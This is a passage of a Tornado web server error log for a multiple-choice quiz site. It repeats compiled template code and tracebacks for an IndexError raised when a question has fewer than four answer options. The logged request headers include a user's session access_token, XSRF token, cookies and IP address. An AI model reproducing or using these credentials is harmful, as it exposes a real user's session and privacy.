  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505b6c9c8e4c854816f48744&answers=%5B2%5D&cursor=14&_xsrf=5cecc491f1154f6ebcbdcc1e0076e69b', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '93', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '86.144.60.190', 'Cookie': 'access_token=QUFBRzZsTmNzNkdjQkFDWXZaQkRzaFNiVjBZWkFaQlpCanBDbE91cWdOa2FISnNmeGRJelNHZmRrREV3ZTM4bExIUHRaQ3k5YXVNaWY4aVlTZVRKOUxaQnExOU11VUU4YlpBbzhjYkNnOFNWY1FaRFpE|1348165845|d2f682bbefb8d68369387848ec4c41326a08626b; _xsrf=5cecc491f1154f6ebcbdcc1e0076e69b; __utma=188782963.1727938829.1348165807.1348165807.1348168841.2; __utmb=188782963.3.10.1348168841; __utmc=188782963; __utmz=188782963.1348165807.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 91.50ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505b6c9c8e4c854816f48744&answers=%5B3%5D&cursor=16&_xsrf=5cecc491f1154f6ebcbdcc1e0076e69b', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '93', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '86.144.60.190', 'Cookie': 'access_token=QUFBRzZsTmNzNkdjQkFDWXZaQkRzaFNiVjBZWkFaQlpCanBDbE91cWdOa2FISnNmeGRJelNHZmRrREV3ZTM4bExIUHRaQ3k5YXVNaWY4aVlTZVRKOUxaQnExOU11VUU4YlpBbzhjYkNnOFNWY1FaRFpE|1348165845|d2f682bbefb8d68369387848ec4c41326a08626b; _xsrf=5cecc491f1154f6ebcbdcc1e0076e69b; __utma=188782963.1727938829.1348165807.1348165807.1348168841.2; __utmb=188782963.3.10.1348168841; __utmc=188782963; __utmz=188782963.1348165807.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 93.80ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
